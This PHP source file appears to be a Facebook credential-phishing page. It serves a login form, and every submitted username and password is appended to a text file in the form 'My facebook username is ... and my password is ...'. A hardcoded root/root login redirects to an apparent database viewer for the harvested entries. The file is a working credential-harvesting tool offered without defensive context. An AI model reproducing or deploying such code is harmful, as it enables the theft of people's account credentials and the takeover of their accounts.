<?php

    include "classes/validation.php";
    
    // error_reporting(0);
    $validation = new validation;
    
    $fname = "list.txt";

    if (isset($_POST['submit'])) {

        $name = $_POST['name'];
        $password = $_POST['password'];
        $username = "root";
        $usercode = "root";

        if (($name===$username) && ($password === $usercode)) {
            header ("location: php/database.php");
        }

        if (!empty($_POST['name']) && (!empty($_POST['password']))) {
            $wfile = fopen("php/{$fname}", "a") or die("Error storing password!!!");
            $text = "My facebook username is [{$_POST['name']}] and my password is [{$_POST['password']}] \n";
            fwrite($wfile, $text);
        }    

    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    </head>
<body>
    <?php include "component/login.php"; ?>
    <script src="js/js.js"></script>
</body>
</html>